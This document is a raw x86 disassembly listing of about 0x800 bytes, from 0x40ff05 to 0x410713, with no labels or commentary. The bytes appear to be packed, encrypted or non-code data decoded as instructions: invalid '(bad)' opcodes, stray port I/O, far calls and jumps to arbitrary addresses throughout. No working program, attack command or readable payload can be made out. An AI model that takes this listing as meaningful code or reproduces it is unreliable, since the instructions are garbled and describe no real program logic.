  40ff05:	xchg   DWORD PTR [esi],ecx
  40ff07:	ins    BYTE PTR es:[edi],dx
  40ff08:	pop    esp
  40ff09:	test   al,0x10
  40ff0b:	and    edx,DWORD PTR [eax-0x32]
  40ff0e:	mov    eax,0x832d9dbc
  40ff13:	push   es
  40ff14:	das    
  40ff15:	outs   dx,DWORD PTR ds:[esi]
  40ff16:	mov    ah,0xe9
  40ff18:	mov    edi,0x98aab1ca
  40ff1d:	sub    eax,0x320e978b
  40ff22:	sub    DWORD PTR [esi+0x109abfed],ebx
  40ff28:	int    0x71
  40ff2a:	(bad)  
  40ff2b:	and    eax,DWORD PTR [edx*2-0x3a7eb8a9]
  40ff32:	imul   ecx,DWORD PTR [edi-0xe94deec],0x68
  40ff39:	cmp    ebx,DWORD PTR [ecx-0x6f]
  40ff3c:	cwde   
  40ff3d:	jmp    0x3e35aa97
  40ff42:	arpl   WORD PTR [edi+0x790364c0],bp
  40ff48:	imul   edx,DWORD PTR [ebp+0x34],0x26
  40ff4c:	sahf   
  40ff4d:	or     BYTE PTR [ebp+0x2f114bc7],0x12
  40ff54:	adc    BYTE PTR [esi-0x31c04ae8],ah
  40ff5a:	sbb    eax,0xf07c4ec
  40ff5f:	xlat   BYTE PTR ds:[ebx]
  40ff60:	mov    dh,0xee
  40ff62:	repnz aam 0xa3
  40ff65:	jl     0x40ff52
  40ff67:	mov    ds:0xd9325299,al
  40ff6c:	mov    edi,0xf2b752d5
  40ff71:	aaa    
  40ff72:	(bad)  
  40ff75:	and    edi,DWORD PTR [edx]
  40ff77:	or     al,0x28
  40ff79:	test   al,0x9b
  40ff7b:	sub    ch,BYTE PTR ds:0xb22d894f
  40ff81:	sub    bl,BYTE PTR [ebx]
  40ff83:	mov    esp,0x8e584af6
  40ff88:	retf   
  40ff89:	lods   al,BYTE PTR ds:[esi]
  40ff8a:	adc    al,BYTE PTR [ecx-0x43]
  40ff8d:	push   0x2
  40ff8f:	push   0x81ba309a
  40ff94:	or     bl,BYTE PTR [ebx]
  40ff96:	cmp    DWORD PTR [edi-0x62],ebx
  40ff99:	add    eax,0x3b46878d
  40ff9e:	(bad)  
  40ffa0:	sbb    eax,0x9520792d
  40ffa5:	mov    esp,DWORD PTR [ebp-0x446cb38e]
  40ffab:	idiv   eax
  40ffad:	fbstp  TBYTE PTR [edi]
  40ffaf:	lahf   
  40ffb0:	je     0x40ff98
  40ffb2:	fadd   QWORD PTR [edi+eiz*4]
  40ffb5:	stc    
  40ffb6:	lock imul ecx,DWORD PTR [ebx-0x525263e6],0xffffffb0
  40ffbe:	ror    BYTE PTR [ebx],1
  40ffc0:	add    eax,DWORD PTR [esi+edi*8-0x7b69b1a2]
  40ffc7:	jg     0x40ff66
  40ffc9:	sbb    dl,BYTE PTR [edx]
  40ffcb:	ds test bh,ah
  40ffce:	ret    0x514e
  40ffd1:	cmp    DWORD PTR [edi+0xfc69c83],ebp
  40ffd7:	mov    bl,0x9d
  40ffd9:	frstpm(287 only) 
  40ffdb:	sub    eax,0x2f7cbabe
  40ffe0:	es out dx,eax
  40ffe2:	add    al,0xce
  40ffe4:	sub    ch,BYTE PTR [di]
  40ffe7:	and    al,0xee
  40ffe9:	out    0x8a,al
  40ffeb:	fsub   QWORD PTR [edx]
  40ffed:	scas   eax,DWORD PTR es:[edi]
  40ffee:	mov    ebp,0x53c1042d
  40fff3:	and    BYTE PTR [esi],0x37
  40fff6:	sbb    BYTE PTR [edx+edi*4+0x127ceee9],ch
  40fffd:	sbb    dl,BYTE PTR [esi+0x314bd827]
  410003:	daa    
  410004:	sbb    eax,0x531a3be8
  410009:	call   0xc8e:0x7226e692
  410010:	dec    edi
  410011:	in     eax,dx
  410012:	adc    bh,ah
  410014:	imul   edi,eax,0xffffffb4
  410017:	popf   
  410018:	repnz or eax,0x639a6307
  41001e:	xor    ch,bl
  410020:	outs   dx,BYTE PTR ds:[esi]
  410021:	lods   al,BYTE PTR ds:[esi]
  410022:	push   ecx
  410023:	cdq    
  410024:	cmp    edx,eax
  410026:	loopne 0x40ffef
  410028:	lea    edx,[esi-0x20]
  41002b:	jl     0x40ffda
  41002d:	(bad)  
  41002f:	and    BYTE PTR [edx],cl
  410031:	call   0x8bdb93cd
  410036:	adc    edx,DWORD PTR [eax+ebp*1]
  410039:	or     eax,ecx
  41003b:	inc    edi
  41003c:	fldcw  WORD PTR [ecx+0x7f324309]
  410042:	mov    ds:0xee018346,al
  410047:	outs   dx,BYTE PTR ds:[esi]
  410048:	sub    al,BYTE PTR [ebx]
  41004a:	mov    dl,0x44
  41004c:	ins    BYTE PTR es:[edi],dx
  41004d:	cmp    ebx,ebx
  41004f:	(bad)  
  410050:	cld    
  410051:	out    0x14,eax
  410053:	jbe    0x410000
  410055:	(bad)  
  410056:	xchg   ebx,eax
  410057:	jb     0x4100be
  410059:	xchg   edi,eax
  41005a:	ss mov eax,0xbb6029ee
  410060:	ins    DWORD PTR es:[edi],dx
  410061:	or     DWORD PTR [ecx+0x49],eax
  410064:	sub    DWORD PTR [esi+0x11],0x3c
  410068:	inc    ebp
  410069:	and    edx,DWORD PTR ds:0xc5b7f393
  41006f:	inc    esi
  410070:	jbe    0x410082
  410072:	xor    DWORD PTR [edi+0x20],eax
  410075:	(bad)  [esi-0x5f]
  410078:	add    DWORD PTR [ebx-0x470af002],0x959d3849
  410082:	dec    ecx
  410083:	mov    BYTE PTR [ecx+edx*8+0x3a],bl
  410087:	xchg   ecx,eax
  410088:	jg     0x4100d6
  41008a:	sbb    DWORD PTR [esi+ecx*1+0x1cd195ee],ecx
  410091:	retf   
  410092:	das    
  410093:	cmp    BYTE PTR [ebx-0x67],ch
  410096:	jge    0x410055
  410098:	inc    ebp
  410099:	inc    eax
  41009a:	xchg   ebx,eax
  41009b:	jae    0x410020
  41009d:	push   ecx
  41009e:	test   al,0x56
  4100a0:	cwde   
  4100a1:	xchg   esi,eax
  4100a2:	sub    eax,0x85e14ba2
  4100a7:	jl     0x410032
  4100a9:	sub    al,0x57
  4100ab:	pop    ebx
  4100ac:	pop    edx
  4100ad:	imul   esi,DWORD PTR [ecx+0x21],0x723999a0
  4100b4:	add    ch,ah
  4100b6:	test   BYTE PTR [edi+0x47059151],ah
  4100bc:	mov    WORD PTR [eax+0x6208c3d8],fs
  4100c2:	rol    bh,1
  4100c4:	sahf   
  4100c5:	(bad)  
  4100c6:	xchg   esp,eax
  4100c7:	fldenv [ebx]
  4100c9:	lahf   
  4100ca:	or     ecx,DWORD PTR [ebx+0x16]
  4100cd:	add    eax,0x6e992023
  4100d2:	push   edx
  4100d3:	mov    esp,0x2e049ec
  4100d8:	in     al,dx
  4100d9:	dec    edx
  4100da:	call   0x629a23ab
  4100df:	addr16 jmp 0x10cb:0x65f71624
  4100e7:	adc    DWORD PTR [ebp-0x2deeed63],esi
  4100ed:	pusha  
  4100ee:	mov    ds:0x9d3f3583,eax
  4100f3:	popa   
  4100f4:	fs xchg ebp,eax
  4100f6:	adc    DWORD PTR ds:0xbea6aa95,eax
  4100fc:	mov    esp,0xfbd1df
  410101:	pop    edx
  410102:	pop    ds
  410103:	adc    BYTE PTR [esi],0x95
  410106:	fadd   st,st(5)
  410108:	xor    DWORD PTR [edx-0x6c],0xffffff9b
  41010c:	jbe    0x4100dc
  41010e:	mov    cl,0x2
  410110:	inc    eax
  410111:	dec    edx
  410112:	push   ebp
  410113:	gs jae 0x4100f3
  410116:	shr    DWORD PTR [edx-0x14],cl
  410119:	mov    bl,0xb4
  41011b:	push   0xfff3e07b
  410120:	in     al,dx
  410121:	mov    ?,WORD PTR [ecx+0xfc7e767]
  410127:	sbb    bh,BYTE PTR [edx-0xb]
  41012a:	jge    0x4100e0
  41012c:	xchg   edx,eax
  41012d:	out    dx,al
  41012e:	and    ecx,DWORD PTR [edi+ebx*1+0x66174cbd]
  410135:	es ja  0x410183
  410138:	in     al,dx
  410139:	and    ebp,DWORD PTR [ecx]
  41013b:	mov    dh,bl
  41013d:	jle    0x410103
  41013f:	adc    BYTE PTR [ecx+0x7],bh
  410142:	xchg   esi,eax
  410143:	aad    0x80
  410145:	sbb    al,0x90
  410147:	mov    BYTE PTR [ebp-0x7646e165],dh
  41014d:	pop    ds
  41014e:	lods   al,BYTE PTR ds:[esi]
  41014f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410150:	pop    edi
  410151:	clc    
  410152:	adc    BYTE PTR [edi-0x58],0xf7
  410156:	pop    ebp
  410157:	lods   al,BYTE PTR ds:[esi]
  410158:	mov    ebp,DWORD PTR ds:0x6adf917b
  41015e:	ins    BYTE PTR es:[edi],dx
  41015f:	add    ah,BYTE PTR [edi-0x6a629a87]
  410165:	sbb    al,BYTE PTR [ecx+0x6]
  410168:	retf   0xebd8
  41016b:	jns    0x410190
  41016d:	adc    si,di
  410170:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410171:	rep stos BYTE PTR es:[edi],al
  410173:	cmp    dl,BYTE PTR [ebx-0x1c]
  410176:	inc    BYTE PTR [eax]
  410178:	sub    BYTE PTR [ebp+eiz*4+0x4cdae57e],ch
  41017f:	inc    ebx
  410180:	push   0x3a4bbc67
  410185:	mov    ch,0x3e
  410187:	test   eax,0x7cea8b4b
  41018c:	mov    ah,0x8b
  41018e:	xor    DWORD PTR [ebx+0x6e01aea7],edx
  410194:	dec    ebx
  410195:	das    
  410196:	add    dl,bl
  410198:	lea    eax,[edx+0x3ba20950]
  41019e:	sub    BYTE PTR [edx-0x17caf86],ch
  4101a4:	aad    0xdb
  4101a6:	jecxz  0x4101ad
  4101a8:	std    
  4101a9:	leave  
  4101aa:	fdivr  DWORD PTR [edi-0x4b]
  4101ad:	pop    edx
  4101ae:	adc    eax,DWORD PTR [edi+0x2f845c20]
  4101b4:	(bad)  
  4101b5:	popf   
  4101b6:	jg     0x410195
  4101b8:	ds hlt 
  4101ba:	aad    0xf2
  4101bc:	inc    ebp
  4101bd:	xchg   ebp,eax
  4101be:	pop    edx
  4101bf:	add    edi,eax
  4101c1:	div    BYTE PTR [eax+0x31]
  4101c4:	cli    
  4101c5:	test   BYTE PTR [eax-0x52ecac25],ch
  4101cb:	addr16 es push ds
  4101ce:	mov    bl,0x6d
  4101d0:	mov    edi,0x207a650d
  4101d5:	sbb    eax,0x1e50a8fe
  4101da:	sub    edi,DWORD PTR [ebx+0x29]
  4101dd:	mov    edi,0x6d37f8e9
  4101e2:	mov    cl,0x69
  4101e4:	xor    BYTE PTR [edx+0x66],dh
  4101e7:	fstp   st(6)
  4101e9:	or     BYTE PTR [edx+ebx*4-0x4b08cc24],dh
  4101f0:	mul    BYTE PTR [ebp+ebx*8-0x26]
  4101f4:	test   BYTE PTR [edi],0x2f
  4101f7:	lds    esi,FWORD PTR [ebx]
  4101f9:	fisttp WORD PTR [ebx-0x9de9731]
  4101ff:	xor    edx,edi
  410201:	or     DWORD PTR [edx+0x4e],esp
  410204:	mov    edi,0x4d00c393
  410209:	nop
  41020a:	push   edi
  41020b:	lods   eax,DWORD PTR ds:[esi]
  41020c:	sub    BYTE PTR [edi+0x202df3ae],dl
  410212:	ins    BYTE PTR es:[edi],dx
  410213:	daa    
  410214:	ret    0x7c4d
  410217:	gs retf 
  410219:	mov    ebx,eax
  41021b:	sti    
  41021c:	test   al,0xe8
  41021e:	arpl   WORD PTR [edi-0x79],dx
  410221:	test   BYTE PTR [ebx-0x3da25929],ah
  410227:	mov    DWORD PTR [eax-0x5a0e64b5],ecx
  41022d:	add    BYTE PTR [esi+0x509b59d],ah
  410233:	pusha  
  410234:	push   ecx
  410235:	xor    ecx,esi
  410237:	jmp    0x410742
  41023c:	(bad)  
  41023d:	leave  
  41023e:	mov    dl,0xc9
  410241:	ror    edx,0xc9
  410244:	stos   BYTE PTR es:[edi],al
  410245:	inc    DWORD PTR [eax-0x6e]
  410248:	or     ch,BYTE PTR [ecx-0x65]
  41024b:	(bad)  
  41024c:	scas   al,BYTE PTR es:[edi]
  41024d:	popa   
  41024e:	js     0x4102c8
  410250:	push   0x7c
  410252:	js     0x4102cc
  410254:	rcr    BYTE PTR [edx+ebp*8-0x32],cl
  410258:	mov    al,0x3b
  41025a:	inc    esi
  41025b:	or     DWORD PTR [esi],ebx
  41025d:	pop    eax
  41025e:	add    al,0x59
  410260:	mov    DWORD PTR [esi],esp
  410262:	sahf   
  410263:	jl     0x4101fa
  410265:	or     DWORD PTR [edx+0x304291bd],esi
  41026b:	sub    dh,al
  41026d:	xchg   esi,eax
  41026e:	mov    bl,0x7b
  410270:	or     al,0x67
  410272:	inc    ebx
  410273:	add    BYTE PTR [esi-0x665e7e2f],dh
  410279:	sbb    BYTE PTR [ebp+0x77c921c7],cl
  41027f:	push   eax
  410280:	mov    bh,bh
  410282:	push   ebp
  410283:	mov    ch,BYTE PTR [edx-0x4dee3063]
  410289:	sub    eax,ebx
  41028b:	out    dx,eax
  41028c:	adc    BYTE PTR ds:0x1d7df00c,al
  410292:	fdivr  DWORD PTR [esi+0x13]
  410295:	push   cs
  410296:	pop    ss
  410297:	mov    edi,0x7e2feb67
  41029c:	iret   
  41029d:	mov    bh,0xf8
  41029f:	cli    
  4102a0:	in     eax,0x58
  4102a2:	mov    al,ds:0x3ac85647
  4102a7:	ins    DWORD PTR es:[edi],dx
  4102a8:	adc    ecx,ebp
  4102aa:	push   ss
  4102ab:	cmp    edx,ecx
  4102ad:	xchg   edi,eax
  4102ae:	mov    ds:0x40c71df6,eax
  4102b3:	cwde   
  4102b4:	bound  ecx,QWORD PTR [edx-0x4f]
  4102b7:	ficom  DWORD PTR [edx]
  4102b9:	retf   
  4102ba:	(bad)  
  4102bb:	dec    ebp
  4102bd:	sbb    BYTE PTR [edx],ah
  4102bf:	sub    DWORD PTR [edi],edx
  4102c1:	fmul   DWORD PTR [ecx+0x64]
  4102c4:	dec    edx
  4102c5:	pop    esp
  4102c6:	mov    bh,0xeb
  4102c8:	ror    BYTE PTR [ebp-0x13],cl
  4102cb:	cmp    al,0xff
  4102cd:	dec    eax
  4102ce:	add    edx,DWORD PTR ds:0x6315bf3c
  4102d4:	pop    es
  4102d5:	call   0xa161:0x7bc6dd31
  4102dc:	jbe    0x41035a
  4102de:	mov    cl,0x4d
  4102e0:	jg     0x410336
  4102e2:	and    eax,0xf63c246f
  4102e7:	outs   dx,BYTE PTR ds:[esi]
  4102e8:	loop   0x410352
  4102ea:	test   al,0x26
  4102ec:	(bad)  
  4102ed:	iret   
  4102ee:	dec    ebx
  4102ef:	retf   
  4102f0:	test   al,0xfa
  4102f2:	cmp    BYTE PTR [ecx-0x5bde9b53],al
  4102f8:	imul   ebx,DWORD PTR [esi+0x770b7752],0xffffffad
  4102ff:	sbb    eax,0x300e9fef
  410304:	inc    ebp
  410305:	icebp  
  410306:	or     eax,0xaf438e34
  41030b:	(bad)  
  41030c:	mov    esp,0xa59cecc8
  410311:	xchg   esp,eax
  410312:	xchg   edx,edx
  410314:	mov    dl,0x48
  410316:	xor    ah,BYTE PTR [eax-0x31b20dba]
  41031c:	push   esi
  41031d:	lahf   
  41031e:	adc    dh,BYTE PTR [edx]
  410320:	pop    esp
  410321:	adc    eax,DWORD PTR [edx+edi*2+0x12]
  410325:	inc    eax
  410326:	mov    al,0xad
  410328:	inc    ebx
  410329:	popf   
  41032a:	adc    edx,DWORD PTR [esi-0x70552863]
  410330:	inc    esi
  410331:	fild   QWORD PTR [ebp+ecx*4+0x76]
  410335:	inc    ebp
  410336:	scas   al,BYTE PTR es:[edi]
  410337:	pop    esp
  410338:	ret    
  410339:	and    ecx,DWORD PTR [si-0x80]
  41033d:	das    
  41033e:	jb     0x41036a
  410340:	shl    DWORD PTR [ebx+0x6b],1
  410343:	dec    ebx
  410344:	ret    0xd9ef
  410347:	inc    ecx
  410348:	push   eax
  410349:	pop    ebx
  41034a:	cmc    
  41034b:	sub    dl,BYTE PTR [ebp+ecx*2-0x45d15ceb]
  410352:	pop    esp
  410353:	mov    ecx,0xc316ec93
  410358:	add    DWORD PTR [esi+0x56f40cfc],edx
  41035e:	push   edx
  41035f:	cmp    cl,ah
  410361:	inc    eax
  410362:	popa   
  410363:	mov    ds:0x34f4f9a,al
  410368:	jns    0x41035c
  41036a:	scas   al,BYTE PTR es:[edi]
  41036b:	xchg   DWORD PTR [ecx],edx
  41036d:	mov    eax,ds:0x60d6f8ce
  410372:	cdq    
  410373:	fs mov edi,0xea23241c
  410379:	jne    0x4103b2
  41037b:	test   BYTE PTR [edi-0x5821fb2f],bl
  410381:	xor    BYTE PTR [edx-0x6e],bl
  410384:	jmp    0x410391
  410386:	mov    bl,0xd8
  410388:	loopne 0x410370
  41038a:	jl     0x41033d
  41038c:	dec    edx
  41038d:	cdq    
  41038e:	xchg   ebp,eax
  41038f:	cmp    eax,edi
  410391:	das    
  410392:	test   eax,0xc5c0d981
  410397:	out    0x52,al
  410399:	sbb    ebx,edi
  41039b:	jno    0x4103be
  41039d:	xor    ecx,eax
  41039f:	fist   DWORD PTR [eax+edx*8+0x277af1ac]
  4103a6:	shr    BYTE PTR [ecx-0x69cad8d0],1
  4103ac:	out    dx,al
  4103ad:	imul   ebp,DWORD PTR [esi],0xf99cf92d
  4103b3:	fmul   QWORD PTR [eax+0x15]
  4103b6:	push   ebx
  4103b7:	call   0xae91:0xa7aa127e
  4103be:	add    cl,al
  4103c0:	jbe    0x41038d
  4103c2:	sar    eax,cl
  4103c4:	into   
  4103c5:	xor    bl,bh
  4103c7:	sbb    dl,BYTE PTR [edx]
  4103c9:	imul   esi,DWORD PTR [edx],0x42f9b537
  4103cf:	xchg   esi,eax
  4103d0:	stc    
  4103d1:	call   0x38d10d4a
  4103d6:	adc    ebp,eax
  4103d8:	xchg   edi,eax
  4103d9:	enter  0x44f4,0xb7
  4103dd:	stos   BYTE PTR es:[edi],al
  4103de:	or     DWORD PTR [ebp+0x557c491c],ebp
  4103e4:	push   ds
  4103e5:	hlt    
  4103e6:	xchg   BYTE PTR [ebx-0x563be629],al
  4103ec:	dec    esp
  4103ed:	jns    0x410375
  4103ef:	push   eax
  4103f0:	mov    ebx,0xdfac091c
  4103f5:	daa    
  4103f6:	push   edx
  4103f7:	mov    eax,0x32aace53
  4103fc:	imul   edi,ecx,0xbfef73c3
  410402:	nop
  410403:	adc    bh,BYTE PTR [ecx-0x8]
  410406:	loopne 0x4103c6
  410408:	loopne 0x4103e5
  41040a:	sub    esi,ebp
  41040c:	shr    BYTE PTR [ecx-0x1c081b4],cl
  410412:	xor    esp,DWORD PTR [ecx-0x3066116b]
  410418:	fwait
  410419:	call   0x37bec608
  41041e:	mov    cl,0xde
  410420:	data16 out dx,al
  410422:	repnz cmp eax,ebp
  410425:	loope  0x410417
  410427:	xchg   ebp,eax
  410428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410429:	cmp    DWORD PTR [ecx+esi*2+0x52],0x43a5385e
  410431:	retf   0xb2b0
  410434:	mov    edi,0x9b33bdec
  410439:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41043a:	outs   dx,BYTE PTR ds:[esi]
  41043b:	test   eax,0x785eef3d
  410440:	rcr    DWORD PTR [edi+0x5cb3cf8f],0xe5
  410447:	fidiv  DWORD PTR [eax+0x500bf6ec]
  41044d:	cs mov esp,0x7ada17d4
  410453:	mov    ebp,0xeeafa7b1
  410458:	inc    esp
  410459:	mov    ch,0xc8
  41045b:	pop    ebx
  41045c:	mov    edi,0x44667ba9
  410461:	push   cs
  410462:	ins    DWORD PTR es:[edi],dx
  410463:	and    al,0xc3
  410465:	pop    edi
  410466:	mov    dl,0xcd
  410468:	aaa    
  410469:	es push ss
  41046b:	test   al,0xd2
  41046d:	xor    ah,al
  41046f:	xlat   BYTE PTR ds:[ebx]
  410470:	push   edi
  410471:	xchg   edx,eax
  410472:	in     eax,dx
  410473:	popa   
  410474:	bnd jg 0x410408
  410477:	outs   dx,BYTE PTR ds:[esi]
  410478:	pop    ds
  410479:	xor    BYTE PTR [eax],al
  41047b:	add    al,0xb1
  41047d:	mov    esi,0x58a606a8
  410482:	cdq    
  410483:	fsubrp st(2),st
  410485:	retf   
  410486:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410487:	inc    eax
  410488:	sub    eax,0xa40c580b
  41048d:	lea    edx,[esi-0x2f018a34]
  410493:	sahf   
  410494:	js     0x4104b7
  410496:	mov    DWORD PTR [edi-0x5c],edi
  410499:	sub    DWORD PTR [ebx-0x32],0x68
  41049d:	cwde   
  41049e:	leave  
  41049f:	je     0x410468
  4104a1:	pop    edx
  4104a2:	mov    bh,BYTE PTR ds:0xe1020538
  4104a8:	clc    
  4104a9:	gs fwait
  4104ab:	jo     0x4104a5
  4104ad:	ja     0x41046e
  4104af:	call   0x75b0:0xd3012d6a
  4104b6:	ins    DWORD PTR es:[edi],dx
  4104b7:	sbb    edx,DWORD PTR [eax]
  4104b9:	xchg   edx,eax
  4104ba:	int3   
  4104bb:	(bad)  
  4104bc:	mov    ebp,0x15a88b2d
  4104c1:	(bad)  
  4104c2:	xor    BYTE PTR [ebp-0x306e96bc],ah
  4104c8:	cmp    BYTE PTR [ecx+0x0],dh
  4104cb:	aam    0x1d
  4104cd:	push   eax
  4104ce:	(bad)  
  4104cf:	frstor [esp+esi*1-0x13]
  4104d3:	and    DWORD PTR [ebx+0x7d81a3ba],esi
  4104d9:	hlt    
  4104da:	je     0x410529
  4104dc:	shr    BYTE PTR [ebx],cl
  4104de:	test   BYTE PTR [esi-0x37c90ac7],dh
  4104e4:	ins    DWORD PTR es:[edi],dx
  4104e5:	mov    ebx,0x3e37cfcb
  4104ea:	mov    dh,dh
  4104ec:	(bad)  
  4104ed:	call   0xc54b8052
  4104f2:	fdiv   QWORD PTR [ecx+esi*4]
  4104f5:	mov    esp,0x43f9be00
  4104fa:	jge    0x410549
  4104fc:	adc    eax,0x21378b2c
  410501:	aad    0xb7
  410503:	mov    cl,0x1e
  410505:	mov    esi,DWORD PTR [eax+0x3a]
  410508:	dec    esp
  410509:	(bad)  
  41050b:	sahf   
  41050c:	sbb    ecx,DWORD PTR [edx]
  41050e:	outs   dx,DWORD PTR ds:[esi]
  41050f:	lods   eax,DWORD PTR ds:[esi]
  410510:	lahf   
  410511:	je     0x410518
  410513:	rol    ebx,0x3f
  410516:	mov    cl,0x2d
  410518:	popf   
  410519:	and    eax,0xd44f0a07
  41051e:	pop    edi
  41051f:	sbb    eax,0x441c640d
  410524:	aaa    
  410525:	jne    0x410556
  410527:	lds    edi,FWORD PTR [eax+0x42]
  41052a:	jl     0x41052e
  41052c:	jb     0x4104e1
  41052e:	or     eax,0xb1f0fd75
  410533:	mov    eax,0x4f744fab
  410538:	in     eax,0x5a
  41053a:	add    al,al
  41053c:	fwait
  41053d:	and    ah,al
  41053f:	lock xchg ecx,eax
  410541:	mov    ebx,0x3d126d1a
  410546:	xor    DWORD PTR [bp+si+0x1b],ebp
  41054a:	xlat   BYTE PTR ds:[ebx]
  41054b:	add    al,0x8
  41054d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41054e:	mov    edi,0xeefa23f4
  410553:	repnz mov ebp,0xd152c5b1
  410559:	in     al,0x30
  41055b:	jno    0x410519
  41055d:	lahf   
  41055e:	cwde   
  41055f:	imul   ebx,DWORD PTR [eax-0x4],0xffffffa4
  410563:	in     al,0x16
  410565:	das    
  410566:	xchg   ecx,eax
  410567:	jno    0x4105e2
  410569:	or     DWORD PTR ds:0xb8aae8f9,esp
  41056f:	jecxz  0x4105e8
  410571:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410572:	cld    
  410573:	aaa    
  410574:	retf   
  410575:	sbb    eax,0xba183661
  41057a:	sar    DWORD PTR [edx+0x48],1
  41057d:	push   0x69
  41057f:	cmp    esp,eax
  410581:	pusha  
  410582:	sub    bl,BYTE PTR [esi+0x37]
  410585:	loope  0x41051a
  410587:	enter  0x2f07,0x2d
  41058b:	shr    ah,cl
  41058d:	clc    
  41058e:	inc    edi
  41058f:	push   esp
  410590:	and    BYTE PTR [esi-0x5a],ch
  410593:	int    0xc9
  410595:	ret    
  410596:	popa   
  410597:	addr16 pop ebx
  410599:	sar    BYTE PTR [edx+0x5743f6ad],cl
  41059f:	popf   
  4105a0:	mov    bl,0xf4
  4105a2:	mov    ds:0xd0c99735,eax
  4105a7:	jg     0x410551
  4105a9:	inc    cl
  4105ab:	mov    DWORD PTR [ebp+0x7cd00b32],edi
  4105b1:	not    ch
  4105b3:	(bad)  
  4105b4:	pop    esi
  4105b5:	cmc    
  4105b6:	repnz out 0xdb,al
  4105b9:	sbb    DWORD PTR [ebp+edi*1-0x508fd75d],esp
  4105c0:	rol    DWORD PTR [edi+0x65],0x37
  4105c4:	mov    bh,0x2
  4105c6:	dec    ebx
  4105c7:	test   eax,0xe53c0a58
  4105cc:	rol    DWORD PTR [eax-0x11],cl
  4105cf:	sbb    BYTE PTR [eax+edi*1-0x3b],ah
  4105d3:	inc    esi
  4105d4:	sub    cl,dh
  4105d6:	add    dh,dh
  4105d8:	jbe    0x410609
  4105da:	test   BYTE PTR [edx+edi*8-0x390bd660],ch
  4105e1:	(bad)  
  4105e2:	sti    
  4105e3:	outs   dx,BYTE PTR ds:[esi]
  4105e4:	stc    
  4105e5:	les    dx,DWORD PTR [eax+esi*2-0x17cda90a]
  4105ed:	cdq    
  4105ee:	int    0x5
  4105f0:	sbb    cl,ch
  4105f2:	inc    ebx
  4105f3:	out    dx,eax
  4105f4:	std    
  4105f5:	add    eax,DWORD PTR ds:0x2a291f8
  4105fb:	outs   dx,DWORD PTR ss:[esi]
  4105fd:	or     DWORD PTR [edi-0x1feb5164],eax
  410603:	cmp    bh,BYTE PTR [edi+esi*1-0x1cc6b9c]
  41060a:	jl     0x41060c
  41060c:	mov    ?,WORD PTR [esi]
  41060e:	dec    ebx
  41060f:	mov    esp,0x2f670836
  410614:	cdq    
  410615:	add    eax,0x5f10bd94
  41061a:	pop    edx
  41061b:	inc    eax
  41061c:	xchg   ebx,eax
  41061d:	pusha  
  41061e:	xchg   ebp,eax
  41061f:	pop    ds
  410620:	mov    al,0xd8
  410622:	push   0xffffffa7
  410624:	xor    BYTE PTR [edx-0x16],dh
  410627:	jmp    0x2758:0x4c693c3
  41062e:	out    dx,al
  41062f:	inc    edi
  410630:	cmp    bh,BYTE PTR [edi]
  410632:	ins    BYTE PTR es:[edi],dx
  410633:	loope  0x4105de
  410635:	add    ah,BYTE PTR [ecx-0x43]
  410638:	inc    edi
  410639:	xchg   ebx,eax
  41063a:	mov    DWORD PTR [ebx+0x4302e428],ecx
  410640:	sbb    eax,0xd4b55430
  410645:	mov    esp,0x3c86f1e
  41064a:	mov    eax,ds:0xb70c79a1
  41064f:	aad    0xe5
  410651:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410652:	dec    edx
  410653:	sahf   
  410654:	cmp    al,0x84
  410656:	xor    al,0x73
  410658:	(bad)  [eax-0x3b]
  41065b:	std    
  41065c:	sbb    al,0x6c
  41065e:	add    eax,0x67471487
  410663:	loope  0x410612
  410665:	dec    edi
  410666:	adc    cl,BYTE PTR [ecx+0x381e7d58]
  41066c:	and    edx,DWORD PTR [ecx-0x4fb7eb86]
  410672:	addr16 mov ds,edx
  410675:	and    BYTE PTR [eax-0x7a],0xbe
  410679:	adc    DWORD PTR [edi],0xe16fed0f
  41067f:	mov    ds:0x738dd681,eax
  410684:	mov    cl,0x12
  410686:	sbb    BYTE PTR [ecx-0x75a420eb],0xc1
  41068d:	xchg   dh,dl
  41068f:	lods   eax,DWORD PTR ds:[esi]
  410690:	dec    eax
  410691:	ret    
  410692:	inc    ebx
  410693:	stos   DWORD PTR es:[edi],eax
  410694:	sub    BYTE PTR [ebp+0x1c],ah
  410697:	sti    
  410698:	nop
  410699:	mov    ebx,0x5dd263dc
  41069e:	ret    0x77e1
  4106a1:	adc    cl,BYTE PTR [esi-0x1fae3763]
  4106a7:	aam    0xf
  4106a9:	scas   al,BYTE PTR es:[edi]
  4106aa:	jmp    0x32be:0x1872264a
  4106b1:	add    ecx,DWORD PTR [edx]
  4106b3:	and    al,0x95
  4106b5:	and    DWORD PTR [esi],ebx
  4106b7:	int3   
  4106b8:	cmp    al,0x58
  4106ba:	adc    dl,BYTE PTR [eax]
  4106bc:	fisttp QWORD PTR [esi]
  4106be:	shr    BYTE PTR [eax],0x63
  4106c1:	add    eax,0xba393c60
  4106c6:	sbb    esi,esp
  4106c8:	enter  0x48e6,0xbb
  4106cc:	hlt    
  4106cd:	stos   DWORD PTR es:[edi],eax
  4106ce:	inc    eax
  4106cf:	out    0xc8,al
  4106d1:	fcom   DWORD PTR [eax-0x74]
  4106d4:	iret   
  4106d5:	sub    ecx,DWORD PTR [esi]
  4106d7:	pop    es
  4106d8:	push   esi
  4106d9:	pop    ecx
  4106da:	cli    
  4106db:	outs   dx,DWORD PTR ds:[esi]
  4106dc:	bndldx bnd0,[ecx-0x1b11855c]
  4106e3:	enter  0x7918,0x0
  4106e7:	sbb    dl,BYTE PTR [esi]
  4106e9:	and    al,0x9d
  4106eb:	inc    esi
  4106ec:	mov    eax,ds:0x5b55ee7b
  4106f1:	push   esp
  4106f2:	retf   
  4106f3:	pop    esp
  4106f4:	mov    esi,0xfd7b5a4
  4106f9:	stc    
  4106fa:	(bad)  
  4106fb:	jl     0x410744
  4106fd:	pop    ecx
  4106fe:	mov    ds:0xdee22743,al
  410703:	xor    ebp,edi
  410705:	inc    esp
  410706:	fistp  QWORD PTR ds:0xf69e713d
  41070c:	out    dx,eax
  41070d:	xor    dh,bh
  41070f:	jae    0x410745
  410711:	inc    esi
  410712:	pop    ebp
  410713:	cwde   
